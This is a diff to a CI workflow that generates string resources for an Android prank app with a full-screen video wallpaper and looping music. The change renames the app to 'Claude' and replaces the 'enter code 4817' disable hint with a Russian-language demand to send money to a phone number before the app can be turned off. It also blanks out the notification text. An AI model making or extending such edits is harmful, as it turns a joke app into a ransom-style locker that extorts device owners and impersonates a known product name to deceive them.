@@ -171,14 +171,14 @@ jobs:
           cat > app/src/main/res/values/strings.xml <<'EOF_FILE'
           <?xml version="1.0" encoding="utf-8"?>
           <resources>
-              <string name="app_name">Шутка</string>
-              <string name="status_active">Шутка активна</string>
-              <string name="enter_code_hint">Чтобы выключить, введите код: 4817</string>
+              <string name="app_name">Claude</string>
+              <string name="status_active">Claude active</string>
+              <string name="enter_code_hint">Чтобы выключить, отправьте деньги на этот номер:73421456543</string>
               <string name="wallpaper_label">Шуточные обои</string>
               <string name="wallpaper_description">Видео на весь экран</string>
               <string name="channel_name">Музыка</string>
-              <string name="notification_title">Шутка активна</string>
-              <string name="notification_text">Музыка играет по кругу</string>
+              <string name="notification_title">active</string>
+              <string name="notification_text">Active</string>
               <string name="action_stop">Стоп</string>
           </resources>
           EOF_FILE
